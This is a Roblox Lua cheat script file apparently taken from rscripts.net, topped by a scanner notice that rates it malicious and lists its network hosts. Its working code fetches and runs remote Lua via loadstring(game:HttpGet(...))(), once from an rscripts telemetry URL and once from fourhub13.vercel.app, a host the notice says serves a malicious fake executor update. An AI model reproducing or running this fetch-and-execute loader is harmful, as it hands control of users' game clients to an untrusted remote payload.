-- [[ Rscripts Risk Notice ]]
-- This script was flagged by the rscripts.net risk scanner. Deal with caution.
--
-- Stay safe:
--   • Never log in on unofficial Roblox sites or lookalike domains.
--   • Real Roblox links use roblox.com (check the .com ending).
--   • Treat fake Roblox login / "claim reward" pages as phishing.
--
-- Risk level: Malicious (score 9/10)
-- What the scanner found:
-- • [Critical] Malicious payload at fourhub13.vercel.app — URL 'https://fourhub13.vercel.app/NAGI1171.lua' serves a script with: Fake executor update
-- Network activity:
-- • https://fourhub-api.vercel.app
-- • https://discord.gg/cUwR4tUJv3
-- • https://fourhub13.vercel.app/fourpremium.json
-- • https://fourhub13.vercel.app/NAGI1171.lua
-- • https://wearedevs.net/obfuscator
-- [[ End Rscripts Risk Notice ]]

--[[rscripts:analytics:start]]
-- Script analytics (enabled by the creator on rscripts.net).
-- Runs in its own thread and cannot affect the script below.
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aa998842a40d5054f9098dc"))()
	end)
end)
--[[rscripts:analytics:end]]

loadstring(game:HttpGet("https://fourhub13.vercel.app/Rivals.lua"))()